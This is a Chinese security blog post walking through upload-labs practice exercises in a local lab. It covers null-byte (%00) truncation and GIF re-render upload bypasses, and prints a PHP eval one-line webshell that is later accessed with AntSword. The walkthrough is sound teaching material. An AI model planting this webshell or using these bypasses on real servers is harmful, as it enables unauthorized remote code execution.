<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>二次渲染绕过 - Daben's Blog</title><meta name=Description content="This is my cool site"><meta property="og:title" content="二次渲染绕过"><meta property="og:description" content="（1）%00截断绕过，要求虚拟机中搭建实验环境，分别实现GET、POST方法的绕过
（2）二次渲染绕过"><meta property="og:type" content="article"><meta property="og:url" content="https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-03T20:45:52+08:00"><meta property="article:modified_time" content="2023-03-03T20:45:52+08:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary"><meta name=twitter:title content="二次渲染绕过"><meta name=twitter:description content="（1）%00截断绕过，要求虚拟机中搭建实验环境，分别实现GET、POST方法的绕过
（2）二次渲染绕过"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/><link rel=prev href=https://senmer.github.io/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/><link rel=next href=https://senmer.github.io/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"二次渲染绕过","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/senmer.github.io\/posts\/file_upload\/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87\/"},"genre":"posts","wordcount":1370,"url":"https:\/\/senmer.github.io\/posts\/file_upload\/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87\/","datePublished":"2023-03-03T20:45:52+08:00","dateModified":"2023-03-03T20:45:52+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?63ce39500f9db1110f1c08d9ed53fa96",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Daben's Blog">Daben's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Daben's Blog">Daben's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">二次渲染绕过</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>作者</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/file_upload/><i class="far fa-folder fa-fw" aria-hidden=true></i>File_Upload</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-03-03>2023-03-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 1370 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 3 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#一实验环境>一、实验环境</a></li><li><a href=#二环境搭建>二、环境搭建</a><ul><li><a href=#21-安装phpstudy-2018>2.1 安装phpStudy 2018</a></li><li><a href=#22-修改magic_quotes_gpcoff>2.2 修改magic_quotes_gpc=Off</a></li><li><a href=#23-下载并上传upload-labs源码至网站根目录点击应用>2.3 下载并上传upload-labs源码至网站根目录，点击应用</a></li></ul></li><li><a href=#三00截断绕过>三、%00截断绕过</a><ul><li><a href=#31-漏洞原理>3.1 漏洞原理</a></li><li><a href=#32-漏洞利用>3.2 漏洞利用</a></li></ul></li><li><a href=#四二次渲染绕过>四、二次渲染绕过</a><ul><li></li></ul></li></ul></nav></div></div><div class=content id=content><p>（1）%00截断绕过，要求虚拟机中搭建实验环境，分别实现GET、POST方法的绕过
（2）二次渲染绕过</p><h2 id=一实验环境>一、实验环境</h2><table><thead><tr><th>软件名称</th><th>部署方式</th><th>版本</th><th>IP</th></tr></thead><tbody><tr><td>phpStudy</td><td>Upload-labs源码部署</td><td>2018 (php-5.2.17)</td><td>172.31.5.1</td></tr><tr><td>BurpSuite</td><td></td><td>professional</td><td>172.31.5.1</td></tr><tr><td>Upload-labs</td><td>docker run -d -p 8081:80 &ndash;name upload-labs cuer/upload-labs</td><td>latest</td><td>172.31.5.7</td></tr></tbody></table><h2 id=二环境搭建>二、环境搭建</h2><h3 id=21-安装phpstudy-2018>2.1 安装phpStudy 2018</h3><p>官网或者第三方下载安装phpStudy后点击切换版本，修改php版本为5.2.17</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303222430673.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303222430673.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303222430673.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303222430673.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230303222430673.png title=image-20230303222430673></p><h3 id=22-修改magic_quotes_gpcoff>2.2 修改magic_quotes_gpc=Off</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303223049095.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303223049095.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303223049095.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303223049095.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230303223049095.png title=image-20230303223049095></p><h3 id=23-下载并上传upload-labs源码至网站根目录点击应用>2.3 下载并上传upload-labs源码至网站根目录，点击应用</h3><blockquote><p>注意：源码部署的upload-labs和docker 部署的关卡不是一一对应的</p></blockquote><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303224616638.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303224616638.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303224616638.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303224616638.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230303224616638.png title=image-20230303224616638></p><h2 id=三00截断绕过>三、%00截断绕过</h2><h3 id=31-漏洞原理>3.1 漏洞原理</h3><p>在url中%00表示ascll码中的0，而ascii中0作为特殊字符(空字符Nul)保留，表示<a href="https://so.csdn.net/so/search?q=%e5%ad%97%e7%ac%a6%e4%b8%b2&amp;spm=1001.2101.3001.7020" target=_blank rel="noopener noreffer">字符串</a>结束，所以当url中出现%00时就会认为字符串已结束</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303215255506.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303215255506.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303215255506.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230303215255506.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230303215255506.png title=image-20230303215255506></p><p>例如：http://www.XXX.com/upload/aaa.php%00bbb.jpg 由于%00有截断功能，服务器(操作系统)在接收的时候，就直接对url编码（即%00）进行解码，然后再去接收文 件，这时候后面的bbb.jpg被截断掉，文件名就变成了aaa.php，所以最后服务器存储的文件名是 aaa.php。</p><p>00截断通常用来绕过web的白名单限制。Upload-labs（Pass-12）看代码可以得知是一个白名单，只允 许上传&rsquo;jpg&rsquo;,&lsquo;png&rsquo;,&lsquo;gif&rsquo;格式的文件。但是上传路径是可以控制的，可以使用%00进行截断。</p><p>漏洞存在的条件:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>1、php版本小于5.3.4 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2、php.ini配置项 magic<span class=nb>_</span>quotes<span class=nb>_</span>gpc=Off 
</span></span></code></pre></div><h3 id=32-漏洞利用>3.2 漏洞利用</h3><p>准备test.jpg文件，内容</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;passwd&#34;</span><span class=p>]);</span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>配置BurpSuite监听172.31.5.1:8080</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304001740366.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304001740366.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304001740366.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304001740366.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304001740366.png title=image-20230304001740366></p><p>开始抓包</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000704477.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000704477.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000704477.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000704477.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304000704477.png title=image-20230304000704477></p><p>浏览器配置代理为172.31.5.1（这里使用Firefox浏览器中的插件配置，读者也可通过设置进行配置）</p><p>上传test.jpg文件</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000517299.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000517299.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000517299.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304000517299.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304000517299.png title=image-20230304000517299></p><p>打开BurpSuite，修改数据包(添加a.php%00)， 点击Forward放行数据包</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002101754.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002101754.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002101754.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002101754.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304002101754.png title=image-20230304002101754></p><p>再回到浏览器，观察到文件上传成功</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002347727.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002347727.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002347727.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002347727.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304002347727.png title=image-20230304002347727></p><p>蚁剑连接成功</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002609329.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002609329.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002609329.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002609329.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304002609329.png title=image-20230304002609329></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002711340.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002711340.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002711340.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230304002711340.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230304002711340.png title=image-20230304002711340></p><h2 id=四二次渲染绕过>四、二次渲染绕过</h2><h4 id=41-漏洞原理>4.1 漏洞原理</h4><p>二次渲染: 某些网站允许用户上传自定义的图片（如头像），用户的图片会被服务器进行二次处理，将原始图片删除，将新图片添加到数据库中。</p><p>在这样的场景下，就需要将一句话木马插入到需要上传的图片中的特定位置，防止代码被服务端二次处理时破坏。</p><p>Upload-labs（Pass-17）就是一个二次渲染的案例。代码如下：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308205919616.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308205919616.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308205919616.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308205919616.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308205919616.png title=image-20230308205919616></p><p>根据文件类型有三种绕过场景</p><ul><li>GIF: 渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可</li><li>PNG: 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块</li><li>JPG: 需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试</li></ul><h4 id=42-gif-二次渲染绕过>4.2 GIF 二次渲染绕过</h4><p>准备一张gif图片如: 原图.gif</p><p>用010Editor打开并在文件末尾插入一句话木马</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308211525926.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308211525926.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308211525926.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308211525926.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308211525926.png title=image-20230308211525926></p><p>将此文件上传至upload-labs（172.31.5.7）</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308212516383.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308212516383.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308212516383.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308212516383.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308212516383.png title=image-20230308212516383></p><p>将上传的文件下载在本地（鼠标右键另存为）：二次渲染.gif</p><p>打开后发现一句话木马已被删除</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213819231.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213819231.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213819231.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213819231.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308213819231.png title=image-20230308213819231></p><p>将两个文件打开对比</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213735650.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213735650.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213735650.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308213735650.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308213735650.png title=image-20230308213735650></p><p>可以发现文件开头的位置，没有受到二次渲染的处理</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214047545.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214047545.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214047545.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214047545.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308214047545.png title=image-20230308214047545></p><p>选择任意位置插入一句话木马</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214414868.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214414868.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214414868.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214414868.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308214414868.png title=image-20230308214414868></p><p>保存并再次上传，然后将上传后的文件下载（80657154.gif)，打开发现一句话木马存在：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214807260.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214807260.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214807260.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308214807260.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308214807260.png title=image-20230308214807260></p><p>浏览器打开文件包含漏洞链接，发现一句话木马已生效</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308221407619.png data-srcset="/images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308221407619.png, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308221407619.png 1.5x, /images/%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e7%bb%95%e8%bf%87/image-20230308221407619.png 2x" data-sizes=auto alt=/images/二次渲染绕过/image-20230308221407619.png title=image-20230308221407619></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-03-03</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/ data-title=二次渲染绕过><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Hacker News" data-sharer=hackernews data-url=https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/ data-title=二次渲染绕过><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/ data-title=二次渲染绕过><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://senmer.github.io/posts/file_upload/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/ data-title=二次渲染绕过><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/file_upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/ class=prev rel=prev title=文件上传绕过><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>文件上传绕过</a>
<a href=/posts/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/ class=next rel=next title=文件包含>文件包含<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
